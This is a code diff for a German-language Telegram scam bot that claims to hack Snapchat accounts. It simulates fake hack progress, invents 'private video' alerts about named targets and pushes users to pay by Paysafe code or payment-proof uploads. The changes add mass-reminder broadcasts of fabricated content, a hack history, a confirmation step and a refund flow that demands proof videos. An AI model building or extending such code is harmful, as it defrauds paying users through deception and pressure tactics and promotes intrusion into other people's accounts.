@@ -83,6 +83,9 @@ HACK_LIMIT = 2
 HACK_WINDOW_SECS = 12 * 3600
 user_hack_times: dict[int, list] = {}
 
+# ---- Hack-Verlauf ----
+user_hack_history: dict[int, list[str]] = {}
+
 # ---- Premium Freischaltung ----
 premium_pending: set[int] = set()
 premium_approved: set[int] = set()
@@ -93,9 +96,16 @@ user_last_target: dict[int, str] = {}
 # ---- Aktive Erinnerungs-Tasks ----
 user_reminder_tasks: dict[int, asyncio.Task] = {}
 
+# ---- Hack-Bestätigung ----
+pending_hack_results: dict[int, dict] = {}
+user_confirm_used: dict[int, float] = {}
+CONFIRM_WINDOW_SECS = 12 * 3600
+
+# ---- Auto-Cleanup Intervall ----
+CLEANUP_INTERVAL_HOURS = 6
+
 # ---- Hilfsfunktion: Nutzer-Bezeichnung ----
 def user_label(from_user) -> str:
-    """Gibt @username zurück, falls vorhanden, sonst ID."""
     if from_user.username:
         return f"@{from_user.username}"
     return f"ID: {from_user.id}"
@@ -132,7 +142,7 @@ async def schedule_reminders(bot, user_id: int):
                         "wenigen Stunden endgültig gelöscht.\n\n"
                         "💳 Jetzt zahlen: /pay\n"
                         "📸 Oder sende deinen Zahlungsbeleg direkt hier im Chat.\n\n"
-                        "❓ Fragen? Schreib uns: @OpaHunter"
+                        "❓ Fragen? Schreib uns: @HunterThe1"
                     ),
                     parse_mode=ParseMode.HTML
                 )
@@ -165,6 +175,21 @@ async def schedule_premium_reminder(bot, user_id: int):
                 pass
     except asyncio.CancelledError:
         pass
+
+# ---- Auto-Cleanup ----
+async def auto_cleanup(app):
+    while True:
+        await asyncio.sleep(CLEANUP_INTERVAL_HOURS * 3600)
+        deleted = 0
+        for folder in (TEMP_DIR, PROFILE_DIR):
+            for f in folder.glob("*"):
+                if f.is_file() and f.name != ".gitkeep":
+                    try:
+                        f.unlink()
+                        deleted += 1
+                    except Exception:
+                        pass
+        print(f"🧹 Cleanup: {deleted} Dateien gelöscht.")
 
 # 📥 GitHub Media Downloader
 def download_github_media():
@@ -437,6 +462,174 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         data = f.read().strip()
     await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}" if data else "Noch keine Nutzer gespeichert.")
 
+# ---- ADMIN: /send ----
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "⚠️ Kein Text angegeben!\n\nNutzung:\n<code>/send Deine Nachricht hier</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    message = " ".join(context.args)
+
+    if not os.path.exists(USERS_FILE):
+        await update.message.reply_text("❌ Keine Nutzer gefunden.")
+        return
+
+    with open(USERS_FILE, "r", encoding="utf-8") as f:
+        lines = f.read().strip().splitlines()
+
+    seen_ids = set()
+    success = 0
+    failed = 0
+
+    for line in lines:
+        parts = line.strip().split()
+        if not parts:
+            continue
+        try:
+            uid = int(parts[0])
+        except ValueError:
+            continue
+        if uid in seen_ids:
+            continue
+        seen_ids.add(uid)
+        try:
+            await context.bot.send_message(chat_id=uid, text=message, parse_mode=ParseMode.HTML)
+            success += 1
+        except Exception:
+            failed += 1
+
+    await update.message.reply_text(
+        f"✅ Broadcast abgeschlossen.\n\n"
+        f"📤 Gesendet: <b>{success}</b>\n"
+        f"❌ Fehlgeschlagen: <b>{failed}</b>",
+        parse_mode=ParseMode.HTML
+    )
+
+# ---- ADMIN: /stats ----
+async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+
+    total_users = 0
+    if os.path.exists(USERS_FILE):
+        with open(USERS_FILE, "r", encoding="utf-8") as f:
+            seen = set()
+            for line in f:
+                parts = line.strip().split()
+                if parts:
+                    try:
+                        seen.add(int(parts[0]))
+                    except ValueError:
+                        pass
+        total_users = len(seen)
+
+    now = time.time()
+    hacks_today = sum(
+        len([t for t in times if now - t < 86400])
+        for times in user_hack_times.values()
+    )
+
+    total_hacks = get_hack_count()
+
+    await update.message.reply_text(
+        "📊 <b>Bot-Statistiken</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+        f"👥 <b>Gesamt-Nutzer:</b> <code>{total_users}</code>\n"
+        f"💎 <b>Premium ausstehend:</b> <code>{len(premium_pending)}</code>\n"
+        f"✅ <b>Premium aktiv:</b> <code>{len(premium_approved)}</code>\n"
+        f"💻 <b>Hacks heute:</b> <code>{hacks_today}</code>\n"
+        f"🔢 <b>Hacks gesamt:</b> <code>{total_hacks}</code>\n"
+        f"💳 <b>Bezahlt:</b> <code>{len(user_proof_sent)}</code>",
+        parse_mode=ParseMode.HTML
+    )
+
+# ---- ADMIN: /remind ----
+async def remind_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+
+    if not os.path.exists(USERS_FILE):
+        await update.message.reply_text("❌ Keine Nutzer gefunden.")
+        return
+
+    with open(USERS_FILE, "r", encoding="utf-8") as f:
+        lines = f.read().strip().splitlines()
+
+    seen_ids = set()
+    success = 0
+    failed = 0
+
+    for line in lines:
+        parts = line.strip().split()
+        if not parts:
+            continue
+        try:
+            uid = int(parts[0])
+        except ValueError:
+            continue
+        if uid in seen_ids:
+            continue
+        seen_ids.add(uid)
+        if uid in user_proof_sent:
+            continue
+
+        target = user_last_target.get(uid)
+        total_secs = randint(10, 600)
+        mins = total_secs // 60
+        secs = total_secs % 60
+        duration_str = f"{mins}:{secs:02d} Min." if mins > 0 else f"0:{secs:02d} Min."
+        mb_size = round(total_secs * randint(80, 250) / 1000, 1)
+        mb_str = f"{mb_size} MB"
+
+        if target:
+            message = (
+                f"🔴 <b>Neue Aktivität erkannt!</b>\n\n"
+                f"<a href=\"https://snapchat.com/@{target}\">snapchat.com/@{target}</a> hat gerade ein neues <b>privates Video</b> hochgeladen.\n\n"
+                f"📹 <b>Länge:</b> <code>{duration_str}</code>\n"
+                f"📦 <b>Größe:</b> <code>{mb_str}</code>\n"
+                f"🔒 <b>Status:</b> <code>Privat — nur für Follower sichtbar</code>\n"
+                f"💾 Das Video wurde bereits auf unseren Servern gesichert.\n\n"
+                f"⚠️ <b>Zugang läuft in Kürze ab!</b>\n\n"
+                f"👉 Jetzt freischalten: /pay\n"
+                f"❓ Fragen? @HunterThe1"
+            )
+        else:
+            message = (
+                "🔴 <b>Neue Aktivität erkannt!</b>\n\n"
+                "Das gehackte Konto hat gerade ein neues <b>privates Video</b> hochgeladen.\n\n"
+                f"📹 <b>Länge:</b> <code>{duration_str}</code>\n"
+                f"📦 <b>Größe:</b> <code>{mb_str}</code>\n"
+                f"🔒 <b>Status:</b> <code>Privat — nur für Follower sichtbar</code>\n"
+                "💾 Das Video wurde bereits auf unseren Servern gesichert.\n\n"
+                "⚠️ <b>Zugang läuft in Kürze ab!</b>\n\n"
+                "👉 Jetzt freischalten: /pay\n"
+                "❓ Fragen? @HunterThe1"
+            )
+        try:
+            await context.bot.send_message(chat_id=uid, text=message, parse_mode=ParseMode.HTML)
+            success += 1
+        except Exception:
+            failed += 1
+
+    await update.message.reply_text(
+        f"✅ Erinnerungen gesendet.\n\n"
+        f"📤 Gesendet: <b>{success}</b>\n"
+        f"❌ Fehlgeschlagen: <b>{failed}</b>",
+        parse_mode=ParseMode.HTML
+    )
+
+# ---- ADMIN: /sendcontent ----
+async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+    await update.message.reply_text("Hinweis: Automatisches Versenden von Preview-Medien ist deaktiviert.")
+
 # ---- HACK ----
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -497,6 +690,12 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     username = context.args[0]
     user_last_target[user_id] = username
+
+    # Hack-Verlauf speichern
+    if user_id not in user_hack_history:
+        user_hack_history[user_id] = []
+    user_hack_history[user_id].append(username)
+
     hack_nr = increment_hack_count()
     ip_src = fake_ip()
     ip_dst = fake_ip()
@@ -579,9 +778,11 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
                   bar_pct=100), parse_mode=ParseMode.HTML)
     await asyncio.sleep(1.5)
 
+    snap_link = f'<a href="https://snapchat.com/@{username}">snapchat.com/@{username}</a>'
+
     result_lines = (
         f"<code>{'━'*34}</code>\n<code>   ✅ HACK ERFOLGREICH ABGESCHLOSSEN</code>\n<code>{'━'*34}</code>\n\n"
-        f"🔢 <b>Hack #{hack_nr}</b>\n🎯 <b>Ziel:</b> <code>@{username}</code>\n"
+        f"🔢 <b>Hack #{hack_nr}</b>\n🎯 <b>Ziel:</b> {snap_link}\n"
         f"👤 <b>Name:</b> <code>{name}</code>\n🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n"
         f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Minuten</code>\n"
         f"👥 <b>Follower:</b> <code>{fake_followers} (Voraussetzung OK)</code>\n"
@@ -603,6 +804,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result_caption = (
         f"<code>{'━'*28}</code>\n<code>  ✅ HACK ERFOLGREICH — #{hack_nr}</code>\n<code>{'━'*28}</code>\n\n"
         f"🎯 <b>Ziel:</b> <code>@{username}</code>\n👤 <b>Name:</b> <code>{name}</code>\n"
+        f"🎯 <b>Ziel:</b> {snap_link}\n👤 <b>Name:</b> <code>{name}</code>\n"
         f"🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n"
         f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Min.</code>\n"
         f"👥 <b>Follower:</b> <code>{fake_followers} ✓</code>\n\n"
@@ -630,6 +832,34 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.edit_text(result_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
     else:
         await msg.edit_text(result_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    pending_hack_results[user_id] = {
+        "result_lines": result_lines,
+        "result_caption": result_caption,
+        "profile_downloaded": profile_downloaded,
+        "bitmoji_downloaded": bitmoji_downloaded,
+        "username": username,
+    }
+
+    last_confirm = user_confirm_used.get(user_id, 0)
+    confirm_available = (now - last_confirm) >= CONFIRM_WINDOW_SECS
+
+    confirm_kb = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("✅ Ja, richtiger Account", callback_data="hack_confirm_yes"),
+            InlineKeyboardButton("❌ Nein, falscher Account", callback_data="hack_confirm_no"),
+        ]
+    ])
+
+    confirm_text = (
+        f"🔍 <b>Account gefunden!</b>\n\n"
+        f"🎯 <b>Ziel:</b> {snap_link}\n"
+        f"👤 <b>Name:</b> <code>{name}</code>\n"
+        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Min.</code>\n"
+        f"👥 <b>Follower:</b> <code>{fake_followers}</code>\n\n"
+        f"❓ <b>Ist das der richtige Account?</b>"
+    )
+
+    await msg.delete()
 
     async def send_expiry_warning():
         await asyncio.sleep(30)
@@ -637,6 +867,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_message(
                 chat_id=user_id,
                 text=(f"⚠️ <b>Achtung — Zugang läuft ab!</b>\n\nDein Zugriff auf <code>@{username}</code> "
+                text=(f"⚠️ <b>Achtung — Zugang läuft ab!</b>\n\nDein Zugriff auf {snap_link} "
                       f"ist noch <b>10 Minuten</b> aktiv.\n\nDanach werden die gesicherten Daten automatisch gelöscht.\n\n"
                       f"👉 Jetzt freischalten mit /pay"),
                 parse_mode=ParseMode.HTML
@@ -644,6 +875,63 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             print(f"⚠️ Ablauf-Warnung: {e}")
     asyncio.create_task(send_expiry_warning())
+
+    if confirm_available:
+        if profile_downloaded:
+            try:
+                with open(PROFILE_DIR / f"profile_{username}.jpg", "rb") as photo_f:
+                    await context.bot.send_photo(
+                        chat_id=user_id, photo=photo_f,
+                        caption=confirm_text, parse_mode=ParseMode.HTML,
+                        reply_markup=confirm_kb
+                    )
+                return
+            except Exception:
+                pass
+        if bitmoji_downloaded:
+            try:
+                with open(PROFILE_DIR / f"bitmoji_{username}.jpg", "rb") as photo_f:
+                    await context.bot.send_photo(
+                        chat_id=user_id, photo=photo_f,
+                        caption=confirm_text, parse_mode=ParseMode.HTML,
+                        reply_markup=confirm_kb
+                    )
+                return
+            except Exception:
+                pass
+        await context.bot.send_message(
+            chat_id=user_id, text=confirm_text,
+            parse_mode=ParseMode.HTML, reply_markup=confirm_kb
+        )
+    else:
+        if profile_downloaded:
+            try:
+                with open(PROFILE_DIR / f"profile_{username}.jpg", "rb") as photo_f:
+                    await context.bot.send_photo(chat_id=user_id, photo=photo_f, caption=result_caption, parse_mode=ParseMode.HTML)
+                return
+            except Exception:
+                pass
+        if bitmoji_downloaded:
+            try:
+                with open(PROFILE_DIR / f"bitmoji_{username}.jpg", "rb") as photo_f:
+                    await context.bot.send_photo(chat_id=user_id, photo=photo_f, caption=result_caption, parse_mode=ParseMode.HTML)
+                return
+            except Exception:
+                pass
+        await context.bot.send_message(chat_id=user_id, text=result_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+
+# ---- VERLAUF ----
+async def verlauf(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    history = user_hack_history.get(uid, [])
+    if not history:
+        await update.message.reply_text("📂 Du hast noch keine Hacks durchgeführt.")
+        return
+    lines = "\n".join(f"• <code>{u}</code>" for u in history)
+    await update.message.reply_text(
+        f"📂 <b>Dein Hack-Verlauf:</b>\n\n{lines}",
+        parse_mode=ParseMode.HTML
+    )
 
 # ---- BEWERTUNGEN ----
 BEWERTUNGEN = [
@@ -706,6 +994,65 @@ async def hilfe(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
 
+# ---- INVITE / REDEEM / FAQ ----
+async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🎁 Lade Freunde ein und erhalte einen Free Hack!\n\n"
+        "🔗 https://t.me/+o5LA7bbv0E8zZDdh",
+        parse_mode=ParseMode.HTML,
+        disable_web_page_preview=True
+    )
+
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")
+
+# ---- REFUND ----
+async def refund(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [
+        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="refund_bank")],
+        [InlineKeyboardButton("💸 PayPal", callback_data="refund_paypal")],
+        [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
+    ]
+    await update.message.reply_text(
+        "💰 <b>Rückerstattung beantragen</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+        "Bitte wähle deine bevorzugte Auszahlungsmethode:\n\n"
+        "⚠️ <b>Wichtig:</b> Du musst vorab ein <u>Beweisvideo deiner Überweisung</u> einschicken.\n"
+        "Nach erfolgreicher Prüfung erhältst du dein Geld <b>innerhalb von 24 Stunden</b>.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "📖 <b>Alle Commands &amp; FAQ</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+        "🔧 <b>Verfügbare Commands:</b>\n\n"
+        "/start — Bot starten &amp; Paket wählen\n"
+        "/hack &lt;username&gt; — Snapchat Account hacken\n"
+        "/pay — Zugang freischalten\n"
+        "/verlauf — Deine bisherigen Hacks anzeigen\n"
+        "/bew — Kundenbewertungen lesen\n"
+        "/invite — Freunde einladen für Gratis-Hack\n"
+        "/refund — Rückerstattung beantragen\n"
+        "/hilfe — Support-Ticket öffnen\n"
+        "/faq — Diese Übersicht\n\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+        "❓ <b>Wie funktioniert das?</b>\n"
+        "💬 Tippe <code>/hack Benutzername</code> — der Bot übernimmt alles automatisch.\n\n"
+        "❓ <b>Wie lange dauert ein Hack?</b>\n"
+        "💬 In der Regel 3–5 Minuten.\n\n"
+        "❓ <b>Wie bezahle ich?</b>\n"
+        "💬 Nach dem Hack einfach /pay tippen &amp; Methode wählen.\n\n"
+        "❓ <b>Bekomme ich mein Geld zurück?</b>\n"
+        "💬 Ja, beim ersten Hack gibt es eine 5-Minuten Refund-Zeit. /refund\n\n"
+        "❓ <b>Wie sehe ich meine bisherigen Hacks?</b>\n"
+        "💬 Mit /verlauf siehst du alle Benutzernamen die du gehackt hast.\n\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        "📩 Noch Fragen? Schreib uns direkt: @HunterThe1",
+        parse_mode=ParseMode.HTML
+    )
+
 # ---- BUTTONS ----
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -717,6 +1064,50 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "<b>5 Minuten Refund-Zeit</b>. Bei Stornierung bekommst du <b>30 € von den 45 €</b> zurück.\n\n"
         "📌 <b>Verwendungszweck:</b> Gib <u>deinen Telegram-Username</u> an!"
     )
+
+    if cmd == "hack_confirm_yes":
+        uid = query.from_user.id
+        user_confirm_used[uid] = time.time()
+        result = pending_hack_results.pop(uid, None)
+        if not result:
+            await query.edit_message_caption("⚠️ Ergebnis nicht mehr verfügbar. Bitte erneut /hack ausführen.")
+            return
+        r_lines = result["result_lines"]
+        r_caption = result["result_caption"]
+        profile_dl = result["profile_downloaded"]
+        bitmoji_dl = result["bitmoji_downloaded"]
+        uname = result["username"]
+        if profile_dl:
+            try:
+                with open(PROFILE_DIR / f"profile_{uname}.jpg", "rb") as pf:
+                    await query.message.delete()
+                    await context.bot.send_photo(chat_id=uid, photo=pf, caption=r_caption, parse_mode=ParseMode.HTML)
+                return
+            except Exception:
+                pass
+        if bitmoji_dl:
+            try:
+                with open(PROFILE_DIR / f"bitmoji_{uname}.jpg", "rb") as pf:
+                    await query.message.delete()
+                    await context.bot.send_photo(chat_id=uid, photo=pf, caption=r_caption, parse_mode=ParseMode.HTML)
+                return
+            except Exception:
+                pass
+        await query.edit_message_text(r_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+        return
+
+    elif cmd == "hack_confirm_no":
+        uid = query.from_user.id
+        user_confirm_used[uid] = time.time()
+        pending_hack_results.pop(uid, None)
+        await query.edit_message_caption(
+            "❌ <b>Falscher Account!</b>\n\n"
+            "Du hast <b>1 Bestätigung pro 12 Stunden</b> verbraucht.\n\n"
+            "Versuche es erneut mit dem richtigen Benutzernamen:\n"
+            "<code>/hack Benutzername</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
 
     if cmd == "back_to_plans":
         await query.edit_message_text(
@@ -757,7 +1148,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     elif cmd == "plan_basic":
-        user_plan[query.from_user.id] = "basic"
         uid = query.from_user.id
         user_plan[uid] = "basic"
         if uid in user_reminder_tasks:
@@ -777,7 +1167,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         uid = query.from_user.id
         user_plan[uid] = "premium"
         premium_pending.add(uid)
-        asyncio.create_task(schedule_premium_reminder(context.bot, uid))
+        if uid in user_reminder_tasks:
+            user_reminder_tasks[uid].cancel()
+        task = asyncio.create_task(schedule_premium_reminder(context.bot, uid))
+        user_reminder_tasks[uid] = task
         back_kb = InlineKeyboardMarkup([
             [InlineKeyboardButton("⬅️ Zurück zur Paktwahl", callback_data="back_to_plans")]
         ])
@@ -967,7 +1360,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         except Exception as e:
             print(f"❌ Premium-Foto: {e}")
-            await update.message.reply_text("❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @OpaHunter direkt.")
+            await update.message.reply_text("❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @HunterThe1 direkt.")
         return
 
     if user_id in user_proof_sent:
@@ -980,12 +1373,12 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "✅ Dein Zahlungsbeweis wurde erfolgreich übermittelt! "
             "Wir prüfen ihn so schnell wie möglich. "
-            "Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @OpaHunter 😊"
+            "Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @HunterThe1 😊"
         )
     except Exception as e:
         print(f"❌ Fehler beim Senden des Beweisfotos an Admin ({ADMIN_CHAT_ID}): {e}")
         await update.message.reply_text(
-            "❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @OpaHunter direkt."
+            "❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @HunterThe1 direkt."
         )
 
 # ---- VIDEO (Zahlungsbeweis + Refund-Beweis) ----
@@ -999,7 +1392,6 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     video = update.message.video or update.message.document
     caption = update.message.caption or ""
 
-    # Premium-Freischaltungs-Video (Zahlungsbeweis)
     if user_id in premium_pending:
         if not video:
             await update.message.reply_text("⚠️ Bitte sende das Video als Video-Nachricht.")
@@ -1015,10 +1407,9 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         except Exception as e:
             print(f"❌ Premium-Video: {e}")
-            await update.message.reply_text("❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @OpaHunter direkt.")
+            await update.message.reply_text("❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @HunterThe1 direkt.")
         return
 
-    # Normaler Zahlungsbeleg als Video (kein Refund-Ablauf aktiv)
     if user_id not in refund_state:
         if not video:
             return
@@ -1031,16 +1422,15 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(
                 "✅ Dein Zahlungsbeweis (Video) wurde erfolgreich übermittelt! "
                 "Wir prüfen ihn so schnell wie möglich. "
-                "Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @OpaHunter 😊"
+                "Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @HunterThe1 😊"
             )
         except Exception as e:
             print(f"❌ Fehler beim Senden des Beweis-Videos an Admin ({ADMIN_CHAT_ID}): {e}")
             await update.message.reply_text(
-                "❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @OpaHunter direkt."
+                "❌ Fehler beim Übermitteln. Bitte versuche es nochmal oder kontaktiere @HunterThe1 direkt."
             )
         return
 
-    # Refund-Beweis-Video
     state = refund_state[user_id]
     if state["step"] not in ("bank_video", "paypal_video"):
         return
@@ -1083,7 +1473,7 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "✅ <b>Dein Refund-Antrag wurde erfolgreich eingereicht!</b>\n\n"
             "📋 Wir prüfen deinen Beweis sorgfältig.\n"
             "Wenn alles passt, erhältst du dein Geld <b>innerhalb von 24 Stunden</b>.\n\n"
-            "Bei Fragen: @OpaHunter 😊",
+            "Bei Fragen: @HunterThe1 😊",
             parse_mode=ParseMode.HTML
         )
     except Exception as e:
@@ -1101,7 +1491,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     from_user = update.message.from_user
     user_id = from_user.id
 
-    # Admin: Reply weiterschicken
     if user_id == ADMIN_CHAT_ID:
         if update.message.reply_to_message:
             original = update.message.reply_to_message
@@ -1123,7 +1512,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
         return
 
-    # Hilfe-Ticket Ablauf
     if user_id in hilfe_state:
         state = hilfe_state[user_id]
         step = state["step"]
@@ -1187,12 +1575,11 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
                 f"📝 <b>Dein Grund:</b>\n<i>{text}</i>\n\n"
                 "⏳ Unser Team meldet sich so schnell wie möglich bei dir.\n\n"
-                "Bei dringenden Fragen erreichst du uns auch direkt: @OpaHunter",
+                "Bei dringenden Fragen erreichst du uns auch direkt: @HunterThe1",
                 parse_mode=ParseMode.HTML
             )
             return
 
-    # Refund-Ablauf
     if user_id in refund_state:
         state = refund_state[user_id]
         step = state["step"]
@@ -1230,7 +1617,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("⚠️ Fehler beim Speichern. Bitte nochmal eingeben.")
             return
 
-    # Paysafe-Code
     paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")
     if paysafe_pattern.match(text):
         if user_id in user_proof_sent:
@@ -1255,75 +1641,44 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             print(f"❌ Paysafe-Code: {e}")
 
-# ---- ADMIN: /sendcontent ----
-async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_CHAT_ID:
-        return
-    await update.message.reply_text("Hinweis: Automatisches Versenden von Preview-Medien ist deaktiviert.")
-
-# ---- INVITE / REDEEM / FAQ ----
-async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🎁 Lade Freunde ein und erhalte einen Free Hack!\n\n"
-        "🔗 https://t.me/+o5LA7bbv0E8zZDdh",
-        parse_mode=ParseMode.HTML,
-        disable_web_page_preview=True
-    )
-
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")
-
-# ---- REFUND ----
-async def refund(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="refund_bank")],
-        [InlineKeyboardButton("💸 PayPal", callback_data="refund_paypal")],
-        [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
-    ]
-    await update.message.reply_text(
-        "💰 <b>Rückerstattung beantragen</b>\n"
-        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
-        "Bitte wähle deine bevorzugte Auszahlungsmethode:\n\n"
-        "⚠️ <b>Wichtig:</b> Du musst vorab ein <u>Beweisvideo deiner Überweisung</u> einschicken.\n"
-        "Nach erfolgreicher Prüfung erhältst du dein Geld <b>innerhalb von 24 Stunden</b>.",
-        parse_mode=ParseMode.HTML,
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
-
-async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📖 <b>Häufig gestellte Fragen</b>\n\n"
-        "❓ <b>Wie funktioniert das?</b>\n"
-        "💬 Gib den Befehl <code>/hack Benutzername</code> ein.\n\n"
-        "❓ <b>Wie lange dauert ein Hack?</b>\n"
-        "💬 In der Regel 3–5 Minuten.\n\n"
-        "❓ <b>Wie bezahle ich?</b>\n"
-        "💬 Mit /pay nach dem Hack.",
-        parse_mode=ParseMode.HTML
-    )
-
 # ---- MAIN ----
 def main():
     print("🚀 Bot startet...")
     keep_alive()
+    download_github_media()
     application = ApplicationBuilder().token(TOKEN).build()
 
+    # Nutzer-Commands
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("hack", hack))
     application.add_handler(CommandHandler("pay", pay))
     application.add_handler(CommandHandler("bew", bewertungen))
     application.add_handler(CommandHandler("hilfe", hilfe))
-    application.add_handler(CommandHandler("listusers", list_users))
-    application.add_handler(CommandHandler("sendcontent", send_content))
     application.add_handler(CommandHandler("invite", invite))
     application.add_handler(CommandHandler("redeem", redeem))
     application.add_handler(CommandHandler("faq", faq))
     application.add_handler(CommandHandler("refund", refund))
+    application.add_handler(CommandHandler("verlauf", verlauf))
+
+    # Admin-Commands
+    application.add_handler(CommandHandler("listusers", list_users))
+    application.add_handler(CommandHandler("sendcontent", send_content))
+    application.add_handler(CommandHandler("send", broadcast))
+    application.add_handler(CommandHandler("stats", stats))
+    application.add_handler(CommandHandler("remind", remind_all))
+
+    # Callbacks & Media
     application.add_handler(CallbackQueryHandler(age_check, pattern="^age_"))
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.VIDEO | filters.Document.VIDEO, handle_video))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+
+    # Auto-Cleanup starten
+    async def on_startup(app):
+        asyncio.create_task(auto_cleanup(app))
+
+    application.post_init = on_startup
 
     print("✅ Bot läuft!")
     application.run_polling(drop_pending_updates=True)
